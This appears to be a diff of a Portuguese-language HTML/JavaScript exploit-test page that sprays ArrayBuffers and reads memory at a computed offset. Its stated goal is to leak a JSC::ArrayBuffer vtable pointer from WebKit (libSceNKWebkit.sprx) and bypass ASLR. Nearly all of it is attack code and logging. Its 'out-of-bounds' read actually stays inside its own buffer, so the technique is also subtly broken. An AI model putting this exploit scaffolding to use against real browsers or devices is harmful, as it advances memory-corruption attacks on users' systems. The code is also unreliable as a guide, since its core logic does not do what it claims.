@@ -2,9 +2,9 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Teste 5: Vazamento de Ponteiro de Vtable (WebKit ASLR Bypass)</title>
+    <title>Teste 6: Vazamento de Vtable v2 (Estilo Teste 2)</title>
     <style>
-        /* ... (mesmos estilos de log dos scripts anteriores) ... */
+        /* ... (mesmos estilos de log) ... */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
         #output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
         .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
@@ -13,10 +13,10 @@
     </style>
 </head>
 <body>
-    <h1>Teste 5: Vazamento de Ponteiro de Vtable de JSC::ArrayBuffer</h1>
-    <p>Baseado na descoberta de que o objeto JSC::ArrayBuffer do targetBuffer começa 16 bytes após o fim do backing store do controlBuffer.
-       Tentaremos ler os primeiros 8 bytes do objeto JSC::ArrayBuffer alvo (que deve ser seu ponteiro de vtable).</p>
-    <button id="runBtn" onclick="runVtableLeakTest()">Iniciar Teste de Vazamento de Vtable</button>
+    <h1>Teste 6: Vazamento de Vtable de JSC::ArrayBuffer v2</h1>
+    <p>Usa a estrutura de leitura OOB do Teste 2 original para tentar ler a vtable de um objeto JSC::ArrayBuffer adjacente.
+       A adjacência é inferida da descoberta do offset de escrita OOB (ctrlDataEnd+32).</p>
+    <button id="runBtn" onclick="runVtableLeakTest_v2()">Iniciar Teste de Vazamento de Vtable v2</button>
     <div id="output"></div>
 
     <script>
@@ -46,127 +46,108 @@
         };
         const toHex64 = (high, low) => `0x${(high>>>0).toString(16).toUpperCase().padStart(8, '0')}${(low>>>0).toString(16).toUpperCase().padStart(8, '0')}`;
 
-        // Offset (em bytes) do início do objeto JSC::ArrayBuffer do target,
-        // relativo ao FIM do backing store do controlBuffer.
-        // Se InícioDoObjetoJSCDoTargetBuffer = FimDoBackingStoreDoControlBuffer + 16
-        // então, para ler o início do objeto JSC, o offset OOB é 16.
-        const OOB_READ_OFFSET_TO_TARGET_JSCOBJ_START = 16;
+        // Do Teste 2 original da Suite:
+        const READER_ALLOCATION_SIZE = 288; // Tamanho físico do ArrayBuffer leitor
+        const READER_BASE_OFFSET_IN_BUFFER = 128;  // Onde a "janela lógica" de leitura OOB começa
+        // O "Fim dos dados úteis" do nosso "controlBuffer" conceitual dentro do leitor_ab.
+        // Vamos definir um tamanho lógico para a parte que "controlamos" com dados conhecidos.
+        const READER_LOGICAL_DATA_SIZE = 32; // Ex: os primeiros 32 bytes após READER_BASE_OFFSET_IN_BUFFER
+                                             // são considerados "nossos dados".
 
-        const attemptVtableLeak = async () => {
-            const FNAME = 'attemptVtableLeak';
-            log("--- Iniciando Teste 5: Vazamento de Ponteiro de Vtable ---", 'test', FNAME);
+        // O objeto JSC::ArrayBuffer do alvo (target_ab_js) começa 16 bytes após o fim
+        // da área de dados de um buffer de controle.
+        // No nosso leitor_ab, o "fim dos dados de controle" é READER_BASE_OFFSET_IN_BUFFER + READER_LOGICAL_DATA_SIZE.
+        const OFFSET_FROM_LOGICAL_END_TO_TARGET_JSCOBJ_START = 16;
 
-            const controlBufferDataSize = 128; // Tamanho do backing store do controlBuffer
-                                              // Precisa ser grande o suficiente para que a leitura OOB não saia do ArrayBuffer físico do controlBuffer.
-                                              // Mas pequeno o suficiente para facilitar a adjacência.
-            const numSpray = 50; // Número de pares de control/target buffers para spray
+        // Portanto, o offset de leitura absoluto DENTRO DO LEITOR_AB para o início do JSC Object do alvo é:
+        const ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE = READER_BASE_OFFSET_IN_BUFFER + READER_LOGICAL_DATA_SIZE + OFFSET_FROM_LOGICAL_END_TO_TARGET_JSCOBJ_START;
+
+        const attemptVtableLeak_v2 = async () => {
+            const FNAME = 'attemptVtableLeak_v2';
+            log("--- Iniciando Teste 6: Vazamento de Vtable v2 ---", 'test', FNAME);
+            log(`   Offset de leitura absoluto no leitor_ab para vtable: ${ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE} (0x${ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE.toString(16)})`, 'info', FNAME);
+
+            const numSpray = 100; // Aumentar o spray
             let leakedVtable = null;
 
-            // Preencher a heap com um padrão pode ajudar a identificar o que estamos lendo
-            // se não for a vtable.
-            // for (let i = 0; i < 200; i++) { new ArrayBuffer(controlBufferDataSize); }
-            // await PAUSE(100);
-
+            // Verificação de sanidade do offset de leitura
+            if ((ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE + 8) > READER_ALLOCATION_SIZE) {
+                log("ERRO CRÍTICO: O offset de leitura calculado para a vtable está FORA da alocação física do leitor_ab.", 'error', FNAME);
+                log(`   ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE (${ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE}) + 8 deve ser <= READER_ALLOCATION_SIZE (${READER_ALLOCATION_SIZE})`, 'error', FNAME);
+                if (runBtn) runBtn.disabled = false;
+                return;
+            }
 
             for (let i = 0; i < numSpray && !leakedVtable; i++) {
-                log(`Tentativa de Spray #${i + 1}`, 'info', FNAME);
-                let control_ab, target_ab_js_obj; // target_ab_js_obj é apenas para o spray, não acessamos diretamente
-                let dv_control;
+                log(`Tentativa de Spray #${i + 1} / ${numSpray}`, 'info', FNAME);
+                let reader_ab, target_ab_js;
+                let dv_reader;
 
                 try {
-                    // Alocamos o control_ab primeiro, depois o target_ab_js_obj que esperamos que fique adjacente.
-                    // O importante é a relação entre o FIM DO BACKING STORE do control_ab
-                    // e o INÍCIO DO OBJETO C++ de 0x60 bytes do target_ab_js_obj.
-                    control_ab = new ArrayBuffer(controlBufferDataSize);
-                    dv_control = new DataView(control_ab);
-                    // Preenche o control_ab para sabermos que não estamos lendo seus próprios dados
-                    for (let j = 0; j < controlBufferDataSize / 4; j++) {
-                        dv_control.setUint32(j * 4, 0xBBBBBBBB, true);
+                    // 1. Alocar o ArrayBuffer leitor (grande fisicamente)
+                    reader_ab = new ArrayBuffer(READER_ALLOCATION_SIZE);
+                    dv_reader = new DataView(reader_ab);
+
+                    // 2. Preencher a "área lógica de dados" do leitor_ab com um padrão conhecido.
+                    // Esta área vai de READER_BASE_OFFSET_IN_BUFFER até READER_BASE_OFFSET_IN_BUFFER + READER_LOGICAL_DATA_SIZE.
+                    for (let k = 0; k < READER_LOGICAL_DATA_SIZE / 4; k++) {
+                        dv_reader.setUint32(READER_BASE_OFFSET_IN_BUFFER + k * 4, 0xBBBBBBBB, true);
                     }
-
-                    // Este é o ArrayBuffer cujo objeto C++ JSC::ArrayBuffer (0x60 bytes) esperamos que
-                    // seja alocado 16 bytes após o FIM do BACKING STORE do control_ab.
-                    target_ab_js_obj = new ArrayBuffer(64); // O tamanho do backing store aqui não importa tanto
-                                                           // quanto o objeto C++ JSC::ArrayBuffer de 0x60 bytes que ele cria.
-
-                    log(`   control_ab (dados: ${controlBufferDataSize}b) e target_ab_js_obj (wrapper: 96b) alocados.`, 'info', FNAME);
-                    await PAUSE(20); // Pequena pausa para estabilizar a heap
-
-                    // Tentativa de Leitura OOB
-                    // Queremos ler 8 bytes (ponteiro de vtable) começando em:
-                    // control_ab.backing_store_start + controlBufferDataSize + OOB_READ_OFFSET_TO_TARGET_JSCOBJ_START
-                    // O DataView dv_control já opera relativo ao control_ab.backing_store_start.
-                    // Então o offset dentro do dv_control é controlBufferDataSize + OOB_READ_OFFSET_TO_TARGET_JSCOBJ_START.
-
-                    const oob_read_address_in_dv = controlBufferDataSize + OOB_READ_OFFSET_TO_TARGET_JSCOBJ_START;
-
-                    if ((oob_read_address_in_dv + 8) <= control_ab.byteLength) {
-                         // Isso não deveria acontecer se OOB_READ_OFFSET_TO_TARGET_JSCOBJ_START > 0.
-                         // Este 'if' é para o caso de estarmos lendo DENTRO do control_ab, o que não é o objetivo aqui.
-                         // A verificação real é se a leitura OOB não excede o ArrayBuffer *físico* do control_ab,
-                         // o que é difícil de garantir sem saber seu tamanho real de alocação (que pode ser maior que controlBufferDataSize).
-                         // Assumimos que o sistema operacional/navegador não travará imediatamente por ler alguns bytes OOB
-                         // se a memória for mapeada, mesmo que "lixo".
-                        log(`   AVISO: Tentando leitura OOB que ainda está DENTRO do control_ab.byteLength. Isso não é o esperado.`, 'warn', FNAME);
-                        // continue; // Pula esta iteração de spray se a lógica estiver errada
-                    }
-
-
-                    log(`   Tentando ler U64 (vtable?) em offset OOB ${OOB_READ_OFFSET_TO_TARGET_JSCOBJ_START} (dv_offset: ${oob_read_address_in_dv})`, 'info', FNAME);
-
-                    // Precisamos garantir que o ArrayBuffer físico do control_ab seja grande o suficiente para esta leitura OOB.
-                    // Se controlBufferDataSize é X, e lemos em X+16, o ArrayBuffer físico precisa ser pelo menos X+16+8.
-                    // Se não for, esta leitura causará um erro do DataView ou um crash.
-                    // Esta é uma limitação: estamos lendo OOB dos DADOS LÓGICOS, mas ainda DENTRO DA ALOCAÇÃO FÍSICA do control_ab.
-                    // Para um vazamento REAL de um objeto ADJACENTE, o control_ab.byteLength (físico) precisaria ser estendido
-                    // ou ter uma vulnerabilidade que permita ler fora de sua alocação física.
-
-                    // *** REVISÃO IMPORTANTE DA LÓGICA OOB READ ***
-                    // A primitiva OOB Read que você explorou no Teste 2 da suíte original
-                    // LIA OOB do backing store de um ArrayBuffer (`buffer_leak_target`).
-                    // Se essa leitura OOB puder atingir o objeto JSC::ArrayBuffer de um buffer vizinho, ótimo.
-                    // O script atual do Teste 5 está configurado para ler no final do *próprio* `control_ab` mais um offset.
-                    // Para que isso funcione como um vazamento de um objeto vizinho, a alocação física do `control_ab`
-                    // teria que ser maior que seu `byteLength` lógico, e o objeto vizinho estaria nesse espaço "slack".
-                    // Ou, a vulnerabilidade OOB Read subjacente (não explicitada aqui, mas assumida pelo Teste 2)
-                    // permite ler além da alocação física.
-
-                    // Por agora, vamos assumir que a leitura em dv_control em oob_read_address_in_dv é possível
-                    // (ou seja, está dentro dos limites físicos da memória alocada para control_ab, mesmo que OOB lógico).
-
-                    let val_low = dv_control.getUint32(oob_read_address_in_dv, true);
-                    let val_high = dv_control.getUint32(oob_read_address_in_dv + 4, true);
-
-                    // Uma vtable válida geralmente não é zero, nem um padrão de preenchimento óbvio.
-                    // E geralmente aponta para uma região de código (ex: dentro de libSceNKWebkit).
-                    if (val_low !== 0 || val_high !== 0) {
-                        if (val_low !== 0xBBBBBBBB && val_high !== 0xBBBBBBBB && // Não é nosso padrão de preenchimento
-                            val_low !== 0xCCCCCCCC && val_high !== 0xCCCCCCCC && // Não é nosso padrão OOB
-                            !(val_high === 0xAAAAAAAA && val_low === 0xAAAAAAAA) ) { // Não é o leak anterior
-                            
-                            leakedVtable = toHex64(val_high, val_low);
-                            log(`!!! VAZAMENTO POTENCIAL DE VTABLE (ou outro ponteiro) !!! Iteração #${i+1}`, 'critical', FNAME);
-                            log(`   Lido em ctrlDataEnd+${OOB_READ_OFFSET_TO_TARGET_JSCOBJ_START}: ${leakedVtable}`, 'leak', FNAME);
-                            log(`   Este valor (${leakedVtable}) é um candidato a ser um ponteiro de vtable do objeto JSC::ArrayBuffer adjacente.`, 'info', FNAME);
-                            log(`   Se for, ele aponta para dentro da libSceNKWebkit.sprx ou outra biblioteca WebKit.`, 'info', FNAME);
-                            log(`   Isso ajuda a calcular o endereço base da biblioteca (ASLR Bypass).`, 'info', FNAME);
-                            // Se você tiver o endereço base esperado de libSceNKWebkit de end_bases.txt, pode comparar.
-                            break; // Sai do loop de spray
-                        } else {
-                            log(`   Lido em ctrlDataEnd+${OOB_READ_OFFSET_TO_TARGET_JSCOBJ_START}: ${toHex64(val_high, val_low)} (padrão conhecido ou zero).`, 'info', FNAME);
+                    // Preencher o resto do reader_ab (a parte "OOB" física) com outro padrão para ver se lemos dele.
+                    for (let k = READER_BASE_OFFSET_IN_BUFFER + READER_LOGICAL_DATA_SIZE; k < READER_ALLOCATION_SIZE; k += 4) {
+                        if (k + 4 <= READER_ALLOCATION_SIZE) {
+                            dv_reader.setUint32(k, 0xCCCCCCCC, true);
                         }
+                    }
+
+                    // 3. Alocar o target_ab_js (cujo objeto C++ JSC::ArrayBuffer queremos que fique adjacente)
+                    // Este é o objeto cujo vtable queremos ler.
+                    target_ab_js = new ArrayBuffer(64); // O tamanho do backing store aqui não importa tanto,
+                                                       // o objeto C++ JSC é sempre 0x60 bytes.
+
+                    log(`   reader_ab (físico: ${READER_ALLOCATION_SIZE}b) e target_ab_js (wrapper C++: 96b) alocados.`, 'info', FNAME);
+                    await PAUSE(10); // Pausa mínima
+
+                    // 4. Tentativa de Leitura OOB no offset calculado
+                    log(`   Tentando ler U64 (vtable?) no offset absoluto ${ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE} do reader_ab...`, 'info', FNAME);
+
+                    let val_low = dv_reader.getUint32(ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE, true);
+                    let val_high = dv_reader.getUint32(ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE + 4, true);
+                    const readValueHex = toHex64(val_high, val_low);
+
+                    log(`   Valor lido: ${readValueHex}`, 'leak', FNAME);
+
+                    // Verificações para um ponteiro de vtable plausível:
+                    // - Não ser zero.
+                    // - Não ser um dos nossos padrões de preenchimento.
+                    // - Não ser o leak 0xAAAAAAAA_AAAAAAAA (que pode ser dados não inicializados).
+                    // - Idealmente, estar em uma faixa de endereço de código (mas não podemos verificar isso facilmente aqui).
+                    if ((val_high !== 0 || val_low !== 0) && // Não é nulo
+                        !(val_high === 0xBBBBBBBB && val_low === 0xBBBBBBBB) &&
+                        !(val_high === 0xCCCCCCCC && val_low === 0xCCCCCCCC) &&
+                        !(val_high === LEAKED_POINTER_BASE_HIGH && val_low === LEAKED_POINTER_BASE_LOW) &&
+                        !(val_high === 0xFFFFFFFF && val_low === 0xFFFFFFFF) // Não é -1
+                        ) {
+
+                        leakedVtable = readValueHex;
+                        log(`!!! VAZAMENTO POTENCIAL DE VTABLE !!! Iteração #${i+1}`, 'critical', FNAME);
+                        log(`   Lido no offset abs. ${ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE} do reader_ab: ${leakedVtable}`, 'leak', FNAME);
+                        log(`   Este valor (${leakedVtable}) é um candidato a ser um ponteiro de vtable do objeto JSC::ArrayBuffer adjacente.`, 'info', FNAME);
+                        log(`   Se for, ele aponta para dentro da libSceNKWebkit.sprx ou outra biblioteca WebKit.`, 'info', FNAME);
+                        log(`   Isso ajuda a calcular o endereço base da biblioteca (ASLR Bypass).`, 'info', FNAME);
+                        break; // Sucesso, sair do loop de spray
                     } else {
-                        log(`   Lido em ctrlDataEnd+${OOB_READ_OFFSET_TO_TARGET_JSCOBJ_START}: Zero.`, 'info', FNAME);
+                        log(`   Valor lido (${readValueHex}) parece ser padrão de preenchimento ou zero. Tentando próximo spray.`, 'info', FNAME);
                     }
                 } catch (e) {
                     log(`   Erro durante a tentativa de leitura OOB na iteração #${i + 1}: ${e.message}`, 'error', FNAME);
-                    // Isso pode acontecer se oob_read_address_in_dv for realmente fora da memória alocada/mapeada.
+                    // Isso é esperado se o offset de leitura estiver fora dos limites físicos reais do reader_ab,
+                    // ou se a memória não for legível.
                 } finally {
-                    // Para limpar e tentar forçar realocação em diferentes posições na próxima iteração do spray
-                    control_ab = null;
-                    target_ab_js_obj = null;
-                    dv_control = null;
-                    if (typeof gc === 'function') gc(); // Solicita coleta de lixo se disponível
+                    // Limpar para a próxima iteração do spray
+                    reader_ab = null; target_ab_js = null; dv_reader = null;
+                    if (typeof gc === 'function') { try { gc(); } catch(e){} } // Forçar coleta de lixo se possível
+                    await PAUSE(5); // Pequena pausa entre sprays
                 }
             }
 
@@ -176,27 +157,27 @@
                 alert(`VAZAMENTO POTENCIAL DE VTABLE: ${leakedVtable}\nVerifique os logs!`);
             } else {
                 log("--- Nenhuma vtable promissora vazada com esta configuração. ---", 'test', FNAME);
-                alert("Nenhuma vtable promissora vazada. Verifique os logs. Pode ser necessário ajustar os tamanhos de spray/buffer ou a estratégia OOB Read.");
+                alert("Nenhuma vtable promissora vazada. Verifique os logs. Pode ser necessário ajustar a estratégia de spray ou os offsets lógicos/físicos.");
             }
         };
 
-        const runVtableLeakTest = async () => {
+        const runVtableLeakTest_v2 = async () => {
             if (runBtn) runBtn.disabled = true;
             outputDiv.innerHTML = '';
-            log("==== INICIANDO TESTE 5: VAZAMENTO DE PONTEIRO DE VTABLE ====", 'test', 'Main');
+            log("==== INICIANDO TESTE 6: VAZAMENTO DE PONTEIRO DE VTABLE v2 ====", 'test', 'Main');
             try {
-                await attemptVtableLeak();
+                await attemptVtableLeak_v2();
             } catch (eOuter) {
-                log(`ERRO INESPERADO NO FLUXO PRINCIPAL do teste 5: ${eOuter.message}`, 'critical', 'Main');
+                log(`ERRO INESPERADO NO FLUXO PRINCIPAL do teste 6: ${eOuter.message}`, 'critical', 'Main');
                 if (eOuter.stack) log(eOuter.stack, 'critical', 'Main');
-                alert(`ERRO CRÍTICO no script do Teste 5: ${eOuter.message}`);
+                alert(`ERRO CRÍTICO no script do Teste 6: ${eOuter.message}`);
             }
-            log("\n==== TESTE 5: VAZAMENTO DE PONTEIRO DE VTABLE CONCLUÍDO ====", 'test', 'Main');
+            log("\n==== TESTE 6: VAZAMENTO DE PONTEIRO DE VTABLE v2 CONCLUÍDO ====", 'test', 'Main');
             if (runBtn) runBtn.disabled = false;
         };
 
-        log("Script Teste 5 (Vazamento de Vtable) carregado e pronto.", "info", "Global");
-        alert("Script Teste 5 CARREGADO. Clique no botão para iniciar.");
+        log("Script Teste 6 (Vazamento de Vtable v2) carregado e pronto.", "info", "Global");
+        alert("Script Teste 6 CARREGADO. Clique no botão para iniciar.");
     </script>
 </body>
 </html>
